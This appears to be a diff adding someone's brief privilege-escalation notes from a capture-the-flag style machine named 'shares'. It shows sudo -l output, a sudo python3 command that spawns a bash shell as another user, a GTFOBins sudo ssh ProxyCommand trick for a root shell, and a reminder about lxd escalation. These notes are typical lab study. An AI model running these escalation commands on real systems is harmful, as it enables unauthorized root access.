@@ -1,0 +1,24 @@
+sudo -l 
+
+User amir may run the following commands on shares:
+(ALL : ALL) ALL
+(amy) NOPASSWD: /usr/bin/pkexec
+(amy) NOPASSWD: /usr/bin/python3
+amir@shares:~$ 
+
+
+//python shell as amy
+sudo -u amy /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
+
+
+sudo -l as amy
+
+User amy may run the following commands on shares:
+(ALL) NOPASSWD: /usr/bin/ssh
+
+
+//GTFObins at rescue
+sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+
+//to explore
+(possible escalation with lxd from amir 'id command')
